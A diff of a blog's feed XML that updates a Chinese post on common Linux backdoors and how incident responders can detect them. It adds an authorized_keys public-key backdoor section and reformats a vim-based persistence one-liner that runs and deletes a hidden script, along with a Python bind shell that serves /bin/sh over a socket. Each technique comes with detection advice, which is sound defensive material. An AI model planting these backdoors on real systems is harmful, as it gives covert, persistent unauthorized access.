@@ -72,7 +72,7 @@
     <link href="http://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/"/>
     <id>http://kevien.github.io/2019/02/16/linux常见backdoor及排查技术/</id>
     <published>2019-02-16T13:38:54.000Z</published>
-    <updated>2020-03-13T09:29:36.920Z</updated>
+    <updated>2020-03-15T06:32:47.386Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">原文已发布至先知平台</div><div class="line">linux常见backdoor及排查技术</div><div class="line">https://xz.aliyun.com/t/4090</div><div class="line">windows常见backdoor、权限维持方法及排查技术</div><div class="line">https://xz.aliyun.com/t/4842</div></pre></td></tr></table></figure>
 <h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2019/02/16/linux常见backdoor及排查技术/backdooropen.jpg" alt=""></p>
@@ -100,11 +100,15 @@
 <li>目前在其它的文章中还没有看到过，自己想出来的，就是将nologin程序替换为bash，很多时候应急人员查看passwd，发现账户对应的shell为nologin认为就是系统的账号且这个账号是不能远程登陆的或者是登陆之后没有shell的，可能就认为这个账号是安全的，所以我们就可以将nologin设置成bash，并且修改这个账号的密码，如系统自带的backup账号就是一个很好用账户<br><img src="/2019/02/16/linux常见backdoor及排查技术/passwd.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/bash.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/login.png" alt=""></li>
 <li>优点：简单</li>
 <li>缺点：暂无</li>
-<li>排查：检查nologin是否被替换</li>
-</ul>
+<li>排查：检查nologin是否被替换<h3 id="认证公钥后门"><a href="#认证公钥后门" class="headerlink" title="认证公钥后门"></a>认证公钥后门</h3></li>
+<li>打过redis未授权漏洞的应该知道里面有一种利用方式就是向服务器authoriezd_keys文件里面写入自己电脑的公钥，这个时候就可以实现免密码登陆。</li>
+<li>优点：简单</li>
+<li>缺点：不太隐蔽</li>
+<li><p>排查：检查每个用户根目录下面authorized_keys文件是否添加了异常了的公钥。</p>
 <h3 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#enter the mal script directory 、execute the script and then remove the script</div><div class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py</div></pre></td></tr></table></figure>
-<ul>
-<li>此方法适用于安装了vim且安装了python扩展(绝大部分默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如使用python监听9999端口。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</div><div class="line">from socket import *</div><div class="line">import subprocess</div><div class="line">import os, threading, sys, time</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">        server=socket(AF_INET,SOCK_STREAM)</div><div class="line">        server.bind((&apos;0.0.0.0&apos;,11))</div><div class="line">        server.listen(5)</div><div class="line">        print &apos;waiting for connect&apos;</div><div class="line">        talk, addr = server.accept()</div><div class="line">        print &apos;connect from&apos;,addr</div><div class="line">        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</div><div class="line">                stdout=talk, stderr=talk, shell=True)</div></pre></td></tr></table></figure>
+</li>
+<li><p>此方法适用于安装了vim且安装了python扩展(绝大部分默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如使用python监听9999端口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</div><div class="line">from socket import *</div><div class="line">import subprocess</div><div class="line">import os, threading, sys, time</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">        server=socket(AF_INET,SOCK_STREAM)</div><div class="line">        server.bind((&apos;0.0.0.0&apos;,11))</div><div class="line">        server.listen(5)</div><div class="line">        print &apos;waiting for connect&apos;</div><div class="line">        talk, addr = server.accept()</div><div class="line">        print &apos;connect from&apos;,addr</div><div class="line">        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</div><div class="line">                stdout=talk, stderr=talk, shell=True)</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2019/02/16/linux常见backdoor及排查技术/vimversion.png" alt=""></p>
